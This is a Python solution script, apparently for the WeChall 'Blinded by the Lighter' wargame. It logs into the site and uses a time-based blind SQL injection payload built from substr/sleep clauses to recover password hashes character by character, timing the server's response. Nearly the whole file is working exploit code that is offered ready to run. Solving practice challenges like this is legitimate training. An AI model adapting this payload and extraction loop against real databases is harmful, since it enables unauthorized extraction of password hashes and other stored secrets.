#
# [Wecall.net] Blinded by the Lighter - Part 2
# Solution by MakMan
# http://mukarramkhalid.com/solution-blinded-by-the-light/
# Requirements : Python 3.4.x or Higher, Requests Module
#
import re, os, sys, time, getpass
try:
  import requests
except:
  exit('[-] Importing Requests module failed')

class weChall:
  '''http://www.wechall.net'''

  loginUrl  = 'http://www.wechall.net/login'
  challUrl  = 'http://www.wechall.net/challenge/blind_lighter/index.php'

  def __init__(self, username, password):
    self.login(username, password)

  def login(self, username, password):
    s = requests.Session()
    r = s.get(self.loginUrl)
    r = s.post(self.loginUrl, data = {'username' : username, 'password' : password, 'login' : 'Login'})
    if 'Welcome back to WeChall' in r.text:
      print('[+] Login Successful')
      print('[+] Closing Side bar for faster page load')
      r = s.get('http://www.wechall.net/index.php?mo=WeChall&me=Sidebar2&rightpanel=0')
      print('[+] Resetting attempt counter')
      r = s.get(self.challUrl + '?reset=me')
      c = r.request.headers['Cookie']
      self.Cookie = c
    else:
      exit('[-] Login Failed')

class solveChall(weChall):
  '''Extending weChall login class'''

  charMap   = ['', 'a', 'b', 'c', 'd', 'e', 'f', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9']
  timeStep  = 1.5

  def makePayload(self, mchar):
    p = '\' or \'\'=\'\' and ('
    for i in range(1, 17):
      p = p + ' if(substr(password,'+ str(mchar) +',1)=\''+ self.charMap[i] +'\', sleep('+ str(i * self.timeStep) +'), 1) and'
    p = p + ' 1)-- -'
    return p

  def inject(self, position):
    print('[+] Solving [Wechall.net] Blinded by the Lighter')
    payload = self.makePayload(position)
    headers = {'Cookie' : self.Cookie}
    data    = {'injection' : payload, 'inject' : 'Inject'}
    try:
      r = requests.post(self.challUrl, headers = headers, data = data, timeout = None)
    except:
      exit('[-] Please check your internet connection')
    phpTime = float(re.search('PHP Time: (.+?)s', r.text).group(1))
    return self.charMap[int(phpTime/1.5)]

  def submitSolution(self, attempt):
    print('[+] Submiting Solution ' + str(attempt) + ' ..')
    headers = {'Cookie' : self.Cookie}
    data    = {'thehash' : self.passHash, 'mybutton' : 'Enter'}
    try:
      r = requests.post(self.challUrl, headers = headers, data = data)
    except:
      exit('[-] Please check your internet connection')
    if 'Wow, you were able to retrieve the correct hash' in r.text:
      print('[+] Successful')
      print('[+] Starting Challenge '+ str(attempt + 1) +'/3')
    elif 'Your answer is correct' in r.text:
      print('[+] Challenge completed successfully')
    else:
      exit('[-] Something went Wrong. Please try again.')

  def solve(self):
    print('[+] Starting Injection')
    print('[+] Please wait .. ')
    time.sleep(3)
    for j in range(1, 4):
      self.passHash = ''
      for i in range(1, 33):
        self.passHash += self.inject(i)
        clear = os.system( 'cls' if os.name == 'nt' else 'clear' )
        print('[+] Challenge '+ str(j) +'/3')
        print('[+] Password hash : ' + self.passHash)
        sys.stdout.flush()
      self.submitSolution(j)

def main():
  u = input('Enter WeChall Username: ')
  p = getpass.getpass('Enter WeChall Password: ')
  a = solveChall(u, p)
  solution = a.solve()

if __name__ == '__main__':
  try:
    main()
  except KeyboardInterrupt:
    print('\n[-] Ctrl-c detected.')

#
